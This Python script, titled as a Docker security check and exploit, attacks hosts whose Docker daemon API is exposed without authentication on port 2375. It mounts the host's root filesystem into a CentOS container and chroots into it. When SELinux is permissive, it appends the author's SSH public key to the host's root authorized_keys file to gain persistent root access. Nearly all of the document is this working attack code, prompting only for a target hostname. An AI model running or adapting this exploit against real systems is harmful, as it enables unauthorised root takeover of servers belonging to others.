#!/usr/bin/env python

# Docker Security Check/Exploit
# Author: Jordan Rodgers (com6056@gmail.com)

import socket
import docker
import requests
import subprocess
import uuid
from distutils.version import LooseVersion

def check_port(host, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((host, port))
    if result == 0:
        print("Docker daemon port is open!")
        return True
    else:
        print("Docker daemon port is not open.")
        return False

def docker_connect(host, port):
    get_version = requests.get(url="http://{}:{}/version".format(host, port))
    remote_version = get_version.json()["Version"]
    docker_client = docker.DockerClient(base_url="http://{}:{}".format(host, port), version=remote_version)
    return docker_client


def check_version(docker_client):
    remote_version = docker_client.version()["Version"]
    if LooseVersion(remote_version) < LooseVersion("1.15"):
        print("Found older version of Docker. Using Docker command-line tools.")
        return True
    else:
        print("Found newer version of Docker. Using Docker Python client.")
        return False


def check_selinux(docker_client, host, port, old_version):
    if old_version:
        selinux_cont_name = str(uuid.uuid4())
        selinux_status = subprocess.check_output(['docker', '-H {}:{}'.format(host, port), 'run', '--name', '{}'.format(selinux_cont_name), '-v/:/mnt', 'centos', 'chroot', '/mnt', '/bin/bash', '-c', 'getenforce']).decode('utf-8').strip()
        subprocess.check_output(['docker', '-H {}:{}'.format(host, port), 'rm', '{}'.format(selinux_cont_name)]).decode('utf-8').strip()
        return selinux_status
    else:
        mount = {'/': {'bind':'/mnt', 'mode': 'ro'}}
        docker_client.containers.run('centos', 'ls /mnt/root', volumes=mount)


def exploit(docker_client, host, port, pubkey_file, old_version):
    pubkey = open(pubkey_file, "r").read().strip()
    if old_version:
        exploit_cont_name = str(uuid.uuid4())
        subprocess.check_output(['docker', '-H {}:{}'.format(host, port), 'run', '--name', '{}'.format(exploit_cont_name), '-v/:/mnt', 'centos', 'chroot', '/mnt', '/bin/bash', '-c', 'mkdir -p /root/.ssh; echo {} >> /root/.ssh/authorized_keys'.format(pubkey)]).decode('utf-8').strip()
        subprocess.check_output(['docker', '-H {}:{}'.format(host, port), 'rm', '{}'.format(exploit_cont_name)]).decode('utf-8').strip()
        subprocess.check_output(['docker', '-H {}:{}'.format(host, port), 'rmi', 'centos']).decode('utf-8').strip()


if __name__ == "__main__":
    host = input("Enter IP or hostname of the system you would like to test: ")
    port = 2375
    pubkey_file = "/home/com6056/.ssh/id_rsa.pub"
    port_open = check_port(host, port)
    if port_open:
        docker_client = docker_connect(host, port)
        old_version = check_version(docker_client)
        selinux_status = check_selinux(docker_client, host, port, old_version)
        print(selinux_status)
        if selinux_status == 'Permissive':
            print("wow...")
            exploit(docker_client, host, port, pubkey_file, old_version)
